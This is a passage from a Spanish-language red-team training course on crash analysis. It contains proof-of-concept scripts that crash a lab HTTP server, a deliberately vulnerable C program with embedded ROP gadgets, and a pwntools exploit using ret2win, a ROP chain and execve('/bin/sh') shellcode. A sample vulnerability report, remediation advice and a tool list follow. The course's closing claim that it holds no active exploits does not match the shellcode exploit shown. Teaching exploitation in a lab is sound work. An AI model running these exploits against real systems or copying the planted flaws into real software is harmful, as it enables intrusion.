conn = remote(HOST, PORT, timeout=TIMEOUT)
conn.send(payload)</p>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_38">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team
response = conn.recvall(timeout=2)
conn.close()
return response
except EOFError:
log.info("Connection closed by server (possible crash)")
return None
except Exception as e:
log.error(f"Connection error: {e}")
return None
def check_server_alive():
"""Verifica si el servidor está respondiendo"""
try:
conn = remote(HOST, PORT, timeout=2)
conn.close()
return True
except:
return False
def trigger_vulnerability():
"""Trigger principal de la vulnerabilidad"""
log.info(f"Target: {HOST}:{PORT}")</p>
<h1 id="verificar-que-servidor-esta-vivo-antes">Verificar que servidor está vivo antes</h1>
<p>if not check_server_alive():
log.failure("Server not responding")
return False</p>
<h1 id="construir-payload-malicioso">Construir payload malicioso</h1>
<h1 id="ajustar-segun-la-vulnerabilidad-especifica">Ajustar según la vulnerabilidad específica</h1>
<p>overflow_size = 256
payload = b"GET /" + b"A" * overflow_size + b" HTTP/1.1\r\n\r\n"
log.info(f"Sending {len(payload)} byte payload")
response = send_payload(payload)</p>
<h1 id="verificar-crash">Verificar crash</h1>
<p>if not check_server_alive():
log.success("Server crashed!")
return True
elif response is None:
log.success("Connection dropped (possible crash)")
return True
else:
log.warning("Server still alive")
return False
if <strong>name</strong> == "<strong>main</strong>":</p>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_39">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team
trigger_vulnerability()
PoC HTTP con requests:</p>
<h1 id="usrbinenv-python3_4">!/usr/bin/env python3</h1>
<p>"""
http_poc.py - PoC para vulnerabilidad en servidor HTTP
"""
import requests
import time
TARGET = "http://127.0.0.1:8888"</p>
<h3 id="timeout-5_1">TIMEOUT = 5</h3>
<p>def check_alive():
"""Verificar si servidor responde"""
try:
requests.get(TARGET, timeout=2)
return True
except:
return False
def trigger_overflow():
"""Enviar request malicioso"""
print(f"[*] Target: {TARGET}")
if not check_alive():
print("[-] Server not responding")
return False</p>
<h1 id="path-overflow">Path overflow</h1>
<p>malicious_path = "/" + "A" * 2000
print(f"[*] Sending overflow ({len(malicious_path)} byte path)")
try:
requests.get(TARGET + malicious_path, timeout=TIMEOUT)
except requests.exceptions.ConnectionError:
print("[+] Connection error (possible crash)")
except requests.exceptions.ReadTimeout:
print("[+] Timeout (possible hang)")
time.sleep(1)
if not check_alive():
print("[+] Server crashed!")
return True
else:
print("[-] Server still alive")</p>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_40">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team
return False
if <strong>name</strong> == "<strong>main</strong>":
trigger_overflow()</p>
<h3 id="5511">5.5.11.</h3>
<h3 id="464-analisis-de-crashes-en-rust-y-go">4.6.4 Análisis de Crashes en Rust y Go</h3>
<p>Rust ‐ Análisis de Panics:</p>
<h1 id="habilitar-backtraces-completos">Habilitar backtraces completos</h1>
<p>export RUST_BACKTRACE=full</p>
<h1 id="ejecutar-y-capturar-panic">Ejecutar y capturar panic</h1>
<p>./rust_target &lt; crash_input 2&gt;&amp;1 | tee panic.log</p>
<h1 id="para-bugs-de-memoria-en-codigo-unsafe-usar-asan-nightly">Para bugs de memoria en código unsafe, usar ASAN (nightly)</h1>
<p>RUSTFLAGS="-Z sanitizer=address" cargo +nightly build
./target/debug/rust_target &lt; crash_input
Rust ‐ Depuración con rust‐gdb:</p>
<h1 id="rust-gdb-incluye-pretty-printers-para-tipos-de-rust">rust-gdb incluye pretty-printers para tipos de Rust</h1>
<p>rust-gdb ./target/debug/rust_target
(gdb) break rust_begin_unwind</p>
<h1 id="break-en-panic">Break en panic</h1>
<p>(gdb) run &lt; crash_input
(gdb) bt</p>
<h1 id="backtrace-con-simbolos-rust">Backtrace con símbolos Rust</h1>
<p>Go ‐ Análisis de Panics:</p>
<h1 id="go-genera-stack-traces-automaticamente-en-panic">Go genera stack traces automáticamente en panic</h1>
<p>./go_target &lt; crash_input 2&gt;&amp;1 | tee panic.log</p>
<h1 id="race-detector-para-bugs-de-concurrencia">Race detector (para bugs de concurrencia)</h1>
<p>go build -race -o target_race
./target_race &lt; crash_input</p>
<h1 id="depuracion-con-delve">Depuración con Delve</h1>
<p>dlv debug
(dlv) break main.vulnerableFunction
(dlv) continue
(dlv) stack</p>
<h1 id="stack-trace">Stack trace</h1>
<p>(dlv) goroutines</p>
<h1 id="ver-todas-las-goroutines">Ver todas las goroutines</h1>
<p>Tabla Comparativa:
Aspecto</p>
<h3 id="cc">C/C++</h3>
<p>Rust
Go
Crash típico</p>
<h3 id="sigsegv-sigabrt">SIGSEGV, SIGABRT</h3>
<p>Panic ﴾safe﴿,
SIGSEGV ﴾unsafe﴿
Panic</p>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_41">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team
Aspecto</p>
<h3 id="cc_1">C/C++</h3>
<p>Rust
Go
Info automática
Mínima
Stack trace, mensaje
Stack trace
completo
Sanitizers</p>
<h3 id="asan-msan-tsan">ASAN, MSAN, TSAN</h3>
<p>ASAN ﴾nightly﴿, Miri
Race detector
Debugger</p>
<h3 id="gdb-lldb">GDB, LLDB</h3>
<p>rust‐gdb, rust‐lldb
Delve
Frontera de ataque
Todo
unsafe, FFI
CGo, reflect</p>
<h3 id="56">5.6.</h3>
<h3 id="47-proyecto-capstone-pipeline-completo-de-analisis">4.7 Proyecto Capstone: Pipeline Completo de Análisis</h3>
<h3 id="561">5.6.1.</h3>
<h3 id="471-escenario">4.7.1 Escenario</h3>
<p>Has completado sesiones de fuzzing en los targets del laboratorio y tienes crashes de: ‐ vulnera-
ble_suite.c ﴾test cases 1‐5﴿‐ vuln_http_server.c ﴾accesible por red﴿
Tu manager necesita un reporte identificando: 1. ¿Cuántos bugs únicos existen realmente? 2. ¿Cuá‐
les son explotables remotamente? 3. Scripts de PoC para los issues de mayor severidad.</p>
<h3 id="562">5.6.2.</h3>
<h3 id="472-binario-con-rop-gadgets">4.7.2 Binario con ROP Gadgets</h3>
<p>Para ejercicios avanzados de explotación, usamos una versión mejorada con gadgets ROP embebi‐
dos:
// vulnerable_suite_rop.c - Versión con gadgets ROP para explotación
// Compilar: gcc -g -fno-stack-protector -no-pie -z execstack vulnerable_suite_rop.c -o vuln_rop</p>
<h1 id="include_6">include <stdio.h></h1>
<h1 id="include_7">include <stdlib.h></h1>
<h1 id="include_8">include <string.h></h1>
<h1 id="include_9">include <unistd.h></h1>
<p>// ============================================================================
// GADGETS ROP - Sobreviven compilación con <strong>attribute</strong>((used))
// ============================================================================
// pop rdi; ret - Setear primer argumento (RDI)
<strong>attribute</strong>((naked, used, section(".text.gadgets")))
void gadget_pop_rdi(void) {
<strong>asm</strong> volatile ("pop %rdi\n" "ret\n");
}
// pop rsi; pop r15; ret - Setear segundo argumento (RSI)
<strong>attribute</strong>((naked, used, section(".text.gadgets")))
void gadget_pop_rsi_r15(void) {
<strong>asm</strong> volatile ("pop %rsi\n" "pop %r15\n" "ret\n");
}</p>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_42">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team
// pop rdx; ret - Setear tercer argumento (RDX)
<strong>attribute</strong>((naked, used, section(".text.gadgets")))
void gadget_pop_rdx(void) {
<strong>asm</strong> volatile ("pop %rdx\n" "ret\n");
}
// jmp rsp - Saltar a shellcode en stack (requiere -z execstack)
<strong>attribute</strong>((naked, used, section(".text.gadgets")))
void gadget_jmp_rsp(void) {
<strong>asm</strong> volatile ("jmp * %rsp\n");
}
// syscall; ret - Syscall directa
<strong>attribute</strong>((naked, used, section(".text.gadgets")))
void gadget_syscall(void) {
<strong>asm</strong> volatile ("syscall\n" "ret\n");
}
// pop rax; ret - Setear número de syscall
<strong>attribute</strong>((naked, used, section(".text.gadgets")))
void gadget_pop_rax(void) {
<strong>asm</strong> volatile ("pop %rax\n" "ret\n");
}
// ============================================================================
// FUNCIONES WIN - Targets para demostrar explotación exitosa
// ============================================================================
void win(void) {
printf("\n========================================\n");
printf("
EXPLOTACIÓN EXITOSA!\n");
printf("
Redirigiste ejecución a win()\n");
printf("========================================\n\n");
exit(0);
}
void win_with_arg(long magic) {
if (magic == 0xdeadbeefcafebabe) {
printf("\n========================================\n");
printf("
EXPLOTACIÓN AVANZADA EXITOSA!\n");
printf("
Argumento correcto: 0x %lx\n", magic);
printf("========================================\n\n");
exit(0);
} else {
printf("[!] win_with_arg llamada con argumento incorrecto: 0x %lx\n", magic);
}
}</p>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_43">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team
void spawn_shell(void) {
printf("[<em>] Spawning shell...\n");
execve("/bin/sh", NULL, NULL);
}
// Funciones vulnerables (igual que vulnerable_suite.c original)
void stack_overflow(char </em>input) {
char buffer[64];
strcpy(buffer, input);
// ¡Sin verificación de límites!
}
void print_gadgets(void) {
printf("\n=== Gadgets ROP Disponibles ===\n");
printf("pop rdi; ret
@
%p\n", (void<em>)gadget_pop_rdi);
printf("pop rsi; pop r15; ret @
%p\n", (void</em>)gadget_pop_rsi_r15);
printf("pop rdx; ret
@
%p\n", (void<em>)gadget_pop_rdx);
printf("pop rax; ret
@
%p\n", (void</em>)gadget_pop_rax);
printf("jmp rsp
@
%p\n", (void<em>)gadget_jmp_rsp);
printf("syscall; ret
@
%p\n", (void</em>)gadget_syscall);
printf("\n=== Funciones Win ===\n");
printf("win()
@
%p\n", (void<em>)win);
printf("win_with_arg(magic)
@
%p
(magic=0xdeadbeefcafebabe)\n", (void</em>)win_with_arg);
printf("spawn_shell()
@
%p\n", (void<em>)spawn_shell);
printf("\n=== Info de Explotación ===\n");
printf("Offset a RIP en stack overflow: 72 bytes\n");
printf("(64 bytes buffer + 8 bytes RBP guardado)\n\n");
}
int main(int argc, char </em>*argv) {
setbuf(stdout, NULL);
if (argc &lt; 2) {
printf("Usage:
%s <test> [input]\n", argv[0]);
printf("
1 <input>
- Stack overflow\n");
printf("</p>
<ul>
<li>Mostrar direcciones de gadgets\n");
return 1;
}
int test = atoi(argv[1]);
switch(test) {
case 1: if (argc&lt;3) return 1; stack_overflow(argv[2]); break;
case 6: print_gadgets(); break;
default: return 1;
}
return 0;
}
Compilación y Verificación:
cd ~/crash_analysis_lab</li>
</ul>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_44">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team</p>
<h1 id="compilar-version-para-explotacion">Compilar versión para explotación</h1>
<p>gcc -g -fno-stack-protector -no-pie -z execstack src/vulnerable_suite_rop.c -o vuln_rop</p>
<h1 id="verificar-gadgets-con-ropper">Verificar gadgets con ropper</h1>
<p>pip install ropper
ropper --file ./vuln_rop --search "pop rdi"
ropper --file ./vuln_rop --search "jmp rsp"</p>
<h1 id="mostrar-direcciones-desde-el-binario">Mostrar direcciones desde el binario</h1>
<p>./vuln_rop 6</p>
<h3 id="563">5.6.3.</h3>
<h3 id="473-exploit-de-explotacion-completo">4.7.3 Exploit de Explotación Completo</h3>
<h1 id="usrbinenv-python3_5">!/usr/bin/env python3</h1>
<p>"""
exploit_rop.py - Exploits para vuln_rop
Técnicas demostradas:
1. ret2win - Redirigir a win()
2. ROP chain - pop rdi + argumento + win_with_arg()
3. jmp rsp + shellcode
NOTA: Los bytes NULL en direcciones de 64-bit limitan
explotación via argv. Exploits reales usan stdin/socket.
"""
from pwn import *
import os
import subprocess
LAB_DIR = os.path.expanduser("~/crash_analysis_lab")
TARGET = os.path.join(LAB_DIR, "vuln_rop")
PAYLOAD_FILE = "/tmp/vuln_rop_payload"
class RopExploit:
def <strong>init</strong>(self):
os.chdir(LAB_DIR)
context.binary = TARGET
context.log_level = 'info'
self.gadgets = self._get_gadgets()
def _get_gadgets(self):
"""Parsear direcciones de gadgets del binario"""
try:
result = subprocess.run([TARGET, "6"], capture_output=True, text=True)
gadgets = {}
for line in result.stdout.split('\n'):
if '@' in line:</p>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_45">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team
parts = line.split('@')
name = parts[0].strip()
addr_str = parts[1].strip().split()[0]
gadgets[name] = int(addr_str, 16)
return gadgets
except:</p>
<h1 id="fallback-ajustar-segun-tu-compilacion">Fallback - ajustar según tu compilación</h1>
<p>return {
'pop rdi; ret': 0x401952,
'win()': 0x401256,
'win_with_arg(magic)': 0x4012b8,
'jmp rsp': 0x40196f,
}
def exploit_ret2win(self):
"""Simple ret2win - redirigir ejecución a win()"""
log.info("=== Exploit: ret2win ===")
offset = 72
win_addr = self.gadgets.get('win()', 0x401256)
payload = b"A" * offset
payload += p64(win_addr)
log.info(f"Payload: {offset} bytes padding + win() @ {hex(win_addr)}")</p>
<h1 id="escribir-payload-a-archivo-para-evitar-problemas-con-argv">Escribir payload a archivo (para evitar problemas con argv)</h1>
<p>with open(PAYLOAD_FILE, 'wb') as f:
f.write(payload)</p>
<h1 id="ejecutar-via-bash-command-substitution">Ejecutar via bash command substitution</h1>
<p>cmd = f'./vuln_rop 1 "$(cat {PAYLOAD_FILE})"'
p = process(['bash', '-c', cmd], cwd=LAB_DIR)
output = p.recvall(timeout=2).decode(errors='replace')
print(output)
if "EXPLOTACIÓN EXITOSA" in output:
log.success("ret2win exitoso!")
return True
return False
def exploit_rop_chain(self):
"""ROP chain: pop rdi; ret -&gt; win_with_arg(0xdeadbeefcafebabe)"""
log.info("=== Exploit: ROP chain con argumento ===")
offset = 72
pop_rdi = self.gadgets.get('pop rdi; ret', 0x401952)
win_arg = self.gadgets.get('win_with_arg(magic)', 0x4012b8)</p>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_46">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team
magic = 0xdeadbeefcafebabe</p>
<h1 id="construir-rop-chain">Construir ROP chain</h1>
<p>payload = b"A" * offset
payload += p64(pop_rdi)</p>
<h1 id="pop-rdi-ret">pop rdi; ret</h1>
<p>payload += p64(magic)</p>
<h1 id="argumento-para-win_with_arg">argumento para win_with_arg</h1>
<p>payload += p64(win_arg)</p>
<h1 id="llamar-win_with_arg">llamar win_with_arg</h1>
<p>log.info(f"ROP chain:")
log.info(f"
pop_rdi
@ {hex(pop_rdi)}")
log.info(f"
magic
= {hex(magic)}")
log.info(f"
win_with_arg @ {hex(win_arg)}")</p>
<h1 id="nota-esta-tecnica-falla-via-argv-porque-bash-strips-null-bytes">NOTA: Esta técnica falla via argv porque bash strips null bytes</h1>
<h1 id="en-un-exploit-real-usarias-stdin-o-socket">En un exploit real, usarías stdin o socket</h1>
<p>log.warning("ROP chain via argv tiene limitaciones de null bytes")
log.info("Ver código para técnica alternativa con GDB")
return False
def exploit_shellcode(self):
"""jmp rsp + shellcode (requiere -z execstack)"""
log.info("=== Exploit: jmp rsp + shellcode ===")
offset = 72
jmp_rsp = self.gadgets.get('jmp rsp', 0x40196f)</p>
<h1 id="shellcode-x86-64-execvebinsh">Shellcode x86-64 execve("/bin/sh")</h1>
<p>shellcode = asm('''
xor rsi, rsi
push rsi
mov rdi, 0x68732f2f6e69622f
push rdi
push rsp
pop rdi
push 59
pop rax
cdq
syscall
''')
payload = b"A" * offset
payload += p64(jmp_rsp)
payload += shellcode
log.info(f"jmp rsp @ {hex(jmp_rsp)} -&gt; {len(shellcode)} byte shellcode")
log.info("Este exploit spawneará un shell interactivo")</p>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_47">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team
with open(PAYLOAD_FILE, 'wb') as f:
f.write(payload)
cmd = f'./vuln_rop 1 "$(cat {PAYLOAD_FILE})"'
p = process(['bash', '-c', cmd], cwd=LAB_DIR)
p.interactive()
if <strong>name</strong> == "<strong>main</strong>":
import sys
exploit = RopExploit()
if len(sys.argv) &gt; 1:
cmd = sys.argv[1]
if cmd == "win":
exploit.exploit_ret2win()
elif cmd == "rop":
exploit.exploit_rop_chain()
elif cmd == "shell":
exploit.exploit_shellcode()
else:</p>
<h1 id="demo-ret2win-por-defecto">Demo ret2win por defecto</h1>
<p>exploit.exploit_ret2win()</p>
<h3 id="564">5.6.4.</h3>
<h3 id="474-generacion-del-reporte-final">4.7.4 Generación del Reporte Final</h3>
<p>Para generar el reporte final, creamos un archivo Markdown estructurado:
cd ~/crash_analysis_lab/capstone
cat &gt; reports/vulnerability_report.md &lt;&lt; 'EOF'
[contenido del reporte - ver formato abajo]</p>
<h3 id="eof">EOF</h3>
<p>echo "Reporte guardado en reports/vulnerability_report.md"
Ejemplo de Reporte de Vulnerabilidades:</p>
<h3 id="5641">5.6.4.1.</h3>
<p>Reporte de Análisis de Crashes: vulnerable_suite.c
Resumen Ejecutivo
El análisis de crashes de vulnerable_suite.c identificó 4 vulnerabilidades explotables únicas y
1 crash no explotable. Todas las vulnerabilidades explotables son locales pero demuestran clases
comunes de vulnerabilidades.
Metodología
1. Generación de Crashes: 28 inputs de crash en 5 test cases
2. Triage: Clasificación automatizada con CASR
3. Deduplicación: Reducción a 5 clusters únicos
4. Análisis: Causa raíz con ASAN y GDB</p>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_48">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team
5. Minimización: Reducción a triggers mínimos
6. PoC Development: Scripts Python confiables
Hallazgos
Hallazgo 1: Stack Buffer Overflow ﴾CRÍTICO﴿
Atributo
Valor
Test Case</p>
<p>Severidad</p>
<h3 id="critico">CRÍTICO</h3>
<p>Clasificación CASR</p>
<h3 id="exploitable_1">EXPLOITABLE</h3>
<p>Causa Raíz
strcpy﴾﴿sin límites a buffer de 64 bytes
Impacto
Control de RIP, potencial RCE
Trigger Mínimo
73 bytes
Offset a RIP
72 bytes
PoC de demostración:
./vuln_no_protect 1 $(python3 -c "print('A'*72 + 'BBBBBBBB')")</p>
<h1 id="rip-0x4242424242424242_1">RIP = 0x4242424242424242</h1>
<p>Hallazgo 2: Heap Buffer Overflow ﴾ALTO﴿
Atributo
Valor
Test Case</p>
<p>Severidad</p>
<h3 id="alto">ALTO</h3>
<p>Clasificación CASR</p>
<h3 id="exploitable_2">EXPLOITABLE</h3>
<p>Causa Raíz
strcpy﴾﴿sin límites a buffer de heap de 32 bytes
Impacto
Corrupción de metadatos del heap
Nota
Silencioso sin ASAN
Hallazgo 3: Use‐After‐Free ﴾ALTO﴿
Atributo
Valor
Test Case</p>
<p>Severidad</p>
<h3 id="alto_1">ALTO</h3>
<p>Clasificación CASR</p>
<h3 id="exploitable_3">EXPLOITABLE</h3>
<p>Causa Raíz
Puntero usado después de free﴾﴿
Impacto
Lectura/escritura arbitraria
Nota
Silencioso sin ASAN
Hallazgo 4: Double Free ﴾ALTO﴿
Atributo
Valor
Test Case</p>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_49">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team
Atributo
Valor
Severidad</p>
<h3 id="alto_2">ALTO</h3>
<p>Clasificación CASR</p>
<h3 id="exploitable_4">EXPLOITABLE</h3>
<p>Causa Raíz
Mismo puntero liberado dos veces
Impacto
Corrupción del heap
Hallazgo 5: NULL Pointer Dereference ﴾BAJO﴿
Atributo
Valor
Test Case</p>
<p>Severidad</p>
<h3 id="bajo">BAJO</h3>
<p>Clasificación CASR</p>
<h3 id="not_exploitable_1">NOT_EXPLOITABLE</h3>
<p>Causa Raíz
Desreferencia de puntero NULL
Impacto
DoS solamente
Recomendaciones
1. Stack Overflow: Reemplazar strcpy() con strncpy() o snprintf()
2. Heap Overflow: Agregar verificación de límites antes de copias
3. UAF: Setear punteros a NULL después de free, usar smart pointers
4. Double‐Free: Rastrear estado de allocación
5. NULL Deref: Agregar verificaciones NULL antes de desreferencias
Entregables
pocs/ ‐ Scripts PoC para cada vulnerabilidad
minimized/ ‐ Inputs de crash minimizados
casrep/ ‐ Reportes de análisis CASR</p>
<h3 id="565">5.6.5.</h3>
<h3 id="475-checklist-del-capstone">4.7.5 Checklist del Capstone</h3>
<p>┌──────────────────────────────────────────────────────────────────────────┐
│</p>
<h3 id="checklist-del-proyecto-capstone">CHECKLIST DEL PROYECTO CAPSTONE</h3>
<p>│
├──────────────────────────────────────────────────────────────────────────┤
│
│</p>
<h3 id="setup">│SETUP</h3>
<p>│
│[ ] Entorno de laboratorio configurado (~/.crash_analysis_lab/)
│
│[ ] Binarios compilados (vuln_no_protect, vuln_asan, vuln_rop)
│
│[ ] Herramientas instaladas (pwntools, CASR, ropper)
│
│
│</p>
<h3 id="fase-1-generacion-de-crashes">│FASE 1: GENERACIÓN DE CRASHES</h3>
<p>│
│[ ] 28+ inputs de crash generados
│
│[ ] Crashes categorizados por test case
│
│
│</p>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_50">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team</p>
<h3 id="fase-2-triage">│FASE 2: TRIAGE</h3>
<p>│
│[ ] Reportes CASR generados para todos los crashes
│
│[ ] Crashes agrupados en 5 clusters únicos
│
│
│</p>
<h3 id="fase-3-analisis">│FASE 3: ANÁLISIS</h3>
<p>│
│[ ] Causa raíz identificada para cada bug único
│
│[ ] Evaluación de explotabilidad completada
│
│</p>
<h3 id="-4-exploitable-1-not_exploitable">- 4 EXPLOITABLE, 1 NOT_EXPLOITABLE</h3>
<p>│
│
│</p>
<h3 id="fase-4-minimizacion">│FASE 4: MINIMIZACIÓN</h3>
<p>│
│[ ] Tamaños de trigger mínimo encontrados
│
│[ ] Archivos minimizados guardados
│
│
│
│FASE 5: DESARROLLO DE PoC
│
│[ ] Suite de PoC Python creada
│
│[ ] Cada PoC probado para confiabilidad (&gt;90%)
│
│[ ] PoC de explotación (ret2win) funcional
│
│
│</p>
<h3 id="fase-6-reporte">│FASE 6: REPORTE</h3>
<p>│
│[ ] Reporte de vulnerabilidades generado
│
│[ ] Severidades correctamente asignadas
│
│[ ] Recomendaciones de remediación incluidas
│
│
│
└──────────────────────────────────────────────────────────────────────────┘</p>
<h3 id="57">5.7.</h3>
<h3 id="48-conclusiones-del-capitulo-4">4.8 Conclusiones del Capítulo 4</h3>
<h3 id="571">5.7.1.</h3>
<p>Principios Fundamentales
1. La reproducibilidad es obligatoria: Antes de cualquier análisis, asegurar que el crash sea
reproducible de manera confiable. Usar rr/TTD para crashes no determinísticos.
2. Los sanitizers son esenciales: ASAN, UBSAN y otros sanitizers convierten bugs silenciosos
en crashes informativos. Siempre usar builds con sanitizers para triage.
3. La automatización escala: Herramientas como CASR automatizan el triage de grandes corpus
de crashes. El pipeline manual no escala más allá de unos pocos bugs.
4. La minimización clarifica: Reducir el input al mínimo necesario facilita el análisis de causa
raíz y hace los PoCs más entendibles.
5. La explotabilidad depende del contexto: El mismo tipo de bug puede ser crítico o informa‐
cional dependiendo del control del atacante, las mitigaciones presentes, y la alcanzabilidad.</p>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_51">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team
6. La documentación importa: Mantener registros claros de crashes, análisis, PoCs y conclusio‐
nes. Los buenos reportes facilitan la comunicación con desarrolladores.</p>
<h3 id="572">5.7.2.</h3>
<p>Tabla de Herramientas Clave
Herramienta
Propósito
Plataforma
WinDbg + TTD
Depuración con time travel
Windows
GDB + Pwndbg
Depuración orientada a exploits
Linux</p>
<h3 id="asanubsan">ASAN/UBSAN</h3>
<p>Detección de bugs de memoria
Todas</p>
<h3 id="casr_2">CASR</h3>
<p>Clasificación y clustering
Linux
rr
Record and replay
Linux
Frida
Instrumentación dinámica
Todas
pwntools
Desarrollo de PoC/exploits
Python
afl‐tmin
Minimización de crashes
Linux</p>
<h3 id="573">5.7.3.</h3>
<p>Preguntas de Discusión
1. ¿Por qué el stack overflow requiere 72 bytes para controlar RIP ﴾no 64﴿?
2. ¿Cómo afectaría ASLR la explotación del stack overflow en vuln_protected?
3. ¿Por qué el NULL pointer dereference se clasifica como NOT_EXPLOITABLE mientras los otros
son EXPLOITABLE?
4. ¿Qué cambios serían necesarios para extender el análisis al target de red vuln_http_server?
5. ¿Cuáles son las consideraciones éticas al publicar código de PoC?</p>
<h3 id="58">5.8.</h3>
<p>Documentación y Estándares
CVSS v4.0 Specification
CWE ‐ Common Weakness Enumeration
MITRE ATT&amp;CK Framework
NVD ‐ National Vulnerability Database</p>
<h3 id="59">5.9.</h3>
<p>Herramientas Principales
Herramienta
Propósito</p>
<h3 id="url">URL</h3>
<h3 id="afl">AFL++</h3>
<p>Fuzzing guiado por cobertura
github.com/AFLplusplus/AFLplu
Honggfuzz
Fuzzing multi‐hilo
github.com/google/honggfuzz
Syzkaller
Fuzzing de kernel
github.com/google/syzkaller
Ghidra
Ingeniería reversa
ghidra‐sre.org
Ghidriff
Diffing binario
github.com/clearbluejar/ghidrif
Pwndbg
Extensión GDB
github.com/pwndbg/pwndbg</p>
<h3 id="casr_3">CASR</h3>
<p>Clasificación de crashes
github.com/ispras/casr</p>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_52">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team</p>
<h3 id="510">5.10.</h3>
<p>Fuentes de Información de Vulnerabilidades
Google Project Zero Blog
Microsoft Security Response Center
CISA Known Exploited Vulnerabilities
Exploit‐DB
Fin del Documento
Este material es de carácter educativo y está destinado a investigadores de seguridad para propósitos
defensivos. No incluye instrucciones operativas peligrosas ni exploits activos.</p></div>
            </div>
            
            <div class="page-nav">
                <a href="04-patch-diffing.html"><i class="fas fa-arrow-left"></i>Capítulo 04: Patch Diffing</a>
                <a class="disabled">Siguiente<i class="fas fa-arrow-right"></i></a>
            </div>
        </main>
    </div>
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
    <script>
        function toggleSidebar() {
            document.getElementById('sidebar').classList.toggle('open');
        }
        
        hljs.highlightAll();
        
        const currentPath = window.location.pathname;
        const fileName = currentPath.split('/').pop().replace('.html', '');
        
        document.querySelectorAll('.nav-item').forEach(item => {
            const href = item.getAttribute('href');
            if (href && href.replace('.html', '') === fileName) {
                item.classList.add('active');
            }
        });
        
        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
            anchor.addEventListener('click', function(e) {
                e.preventDefault();
                const target = document.querySelector(this.getAttribute('href'));
                if (target) {
                    target.scrollIntoView({ behavior: 'smooth', block: 'start' });
                }
            });
        });
    </script>
</body>
</html>
